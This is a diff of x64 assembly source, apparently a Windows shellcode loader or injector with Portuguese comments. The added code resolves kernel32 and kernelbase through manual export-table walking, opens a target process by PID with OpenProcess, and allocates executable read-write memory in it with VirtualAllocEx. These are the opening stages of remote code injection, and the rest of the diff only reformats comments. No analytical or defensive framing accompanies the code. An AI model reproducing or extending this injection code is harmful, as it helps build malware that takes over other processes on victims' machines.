@@ -223,7 +223,78 @@ ProcessNext2:
 	FimGetPid2:
 		mov rbp,rax
 		add rsp, 0x160
-		add rsp, 0x10 	 	 
+		add rsp, 0x10 
+	
+	
+	call Locate_kernel32
+	call LoadLibrary
+	
+	loadKernelbase2:
+		mov rax, "se.dll"     
+		push rax
+		mov rax, "kernelba"
+		push rax
+		mov rcx, rsp
+		sub rsp, 0x30
+		call rsi
+		mov r15,rax
+		add rsp, 0x30
+		add rsp, 0x10
+		; Load kernelbase.dll
+
+
+	OpenProcess2:
+		;Lookup OpenProcess
+		mov rax, "ess"
+		push rax
+		mov rax, "OpenProc"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		add rsp, 0x30
+
+		;call OpenProcess
+		xor edx,edx
+		mov ecx, 0x2000000
+		mov r8, rbp
+		sub rsp, 0x30
+		call r12
+		mov rbp, rax
+		add rsp, 0x30
+		mov r13, rax
+
+	VirtualAllocEx2:
+		;Lookup VirtualAllocEx
+		mov rax, "llocEx"
+		push rax
+		mov rax, "VirtualA"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+
+		mov r15, rbx
+		
+		;call VirtualAllocEx
+		xor rcx,rcx
+		xor rbx,rbx
+		mov rbx, 0x20000
+		mov r8d, ebx
+		xor edx,edx
+		mov rcx, r13
+		mov [rsp+0x20], dword 0x40
+		mov r9d, 0x1000
+		mov rbp, r13
+		call r12
+		mov rbx, r15
+		mov rdi,rax
+
+		
 ret
 
 section .text
@@ -289,15 +360,15 @@ WinMain:
 			call decCode
 	ret
 	
-    ;***************
+	;***************
     ;*     AND     *
     ;***************
 		
 	
 
-    ;********************************
-    ;* ABAIXO SÃO FUNÇÕES PARA USO  *
-    ;********************************
+	;********************************
+	;* ABAIXO SÃO FUNÇÕES PARA USO  *
+	;********************************
 	
     ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
     FinFunctionGetProcAddress:
